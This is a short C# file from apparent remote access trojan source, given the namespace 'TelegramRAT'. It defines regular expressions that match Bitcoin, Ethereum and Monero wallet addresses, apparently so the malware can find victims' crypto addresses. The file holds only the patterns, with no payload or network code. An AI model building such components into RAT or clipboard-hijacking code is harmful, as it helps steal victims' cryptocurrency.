using System.Text.RegularExpressions;

namespace TelegramRAT;

internal static class PatternRegex
{
	public static readonly Regex btc = new Regex("\\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\\b");

	public static readonly Regex eth = new Regex("\\b0x[a-fA-F0-9]{40}\\b");

	public static readonly Regex xmr = new Regex("\\b4([0-9]|[A-B])(.){93}\\b");
}
